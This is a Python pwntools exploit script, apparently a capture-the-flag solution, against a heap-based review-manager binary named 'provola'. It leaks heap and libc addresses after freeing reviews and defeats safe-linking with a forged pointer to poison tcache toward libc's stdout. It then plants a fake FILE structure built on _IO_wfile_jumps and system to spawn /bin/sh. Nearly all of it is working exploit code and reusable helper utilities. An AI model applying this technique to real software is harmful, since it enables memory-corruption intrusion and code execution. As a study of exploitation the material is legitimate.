from pwn import *

con = "127.0.0.1 2727"

host, port = con.replace(" ", ":").split(":")

ssl = False

binary = './provola'

gdbscript = '''
    c
'''

elf  = context.binary = ELF(binary)
libc = context.binary.libc
context.terminal = ['tmux', 'splitw', '-h']



# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
ls         = lambda x: log.success(x)
lss        = lambda x: ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB: return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: return remote(host, port, ssl=ssl)
    else: return process([elf.path] + argv, *a, **kw)


def add_review(name, rating, review, review_len=0):
    sla(b'> ', b'1')
    sla(b'name: ', name)
    sla(b'rating (1-10): ', str(rating).encode())
    sla(b'2048): ', str(review_len) if review_len != 0 else str(len(review)+1).encode())
    sla(b'review: ', review)


def list_reviews(idx):
    sla(b'> ', b'2')
    ru(b"%d. " % idx)
    name = ru(b' - rating: ').strip()
    ru(b'review:\n')
    review = rl().strip()
    return name, review


def delete_review(idx):
    sla(b'> ', b'3')
    sla(b'id to delete: ', str(idx).encode())

def edit_review(idx, review):
    sla(b'> ', b'4')
    sla(b'edit: ', str(idx).encode())
    sla(b':', review)

p = start()

add_review(b'provola', 10, b'best provola ever', 2000)
add_review(b'provola2', 9, b'second best provola', 0x200)
add_review(b'provola3', 8, b'third best provola', 0x200)

delete_review(0)
delete_review(2)
delete_review(1)

heap_leak, libc_leak = list_reviews(0)

heap_base = u64(heap_leak) << 12
libc_leak = u64(libc_leak) << 8

libc.address = libc_leak - 2112256

lss("heap_base")

logbase()
edit_review(1, p64(prot_ptr(heap_base + 0xb40, libc.sym._IO_2_1_stdout_)))



add_review(b'provola4', 10, b'fourth best provola', 0x200)

stdout_file_lock = libc.address + 2119440
stdout = libc.sym._IO_2_1_stdout_
fake_vtable = libc.sym._IO_wfile_jumps - 0x18

filestruct = FileStructure(0)
filestruct.flags = 0x3b01010101010101
filestruct._IO_read_end = libc.sym.system
filestruct._IO_save_base = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx
filestruct._IO_write_end = u64(b'/bin/sh')
filestruct._lock = stdout_file_lock
filestruct._codecvt = stdout + 0xb8
filestruct._wide_data = stdout + 0x200
filestruct.unknown2 = p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3 + p64(fake_vtable)


add_review(b'provola5', 9, bytes(filestruct), 0x200)

p.interactive()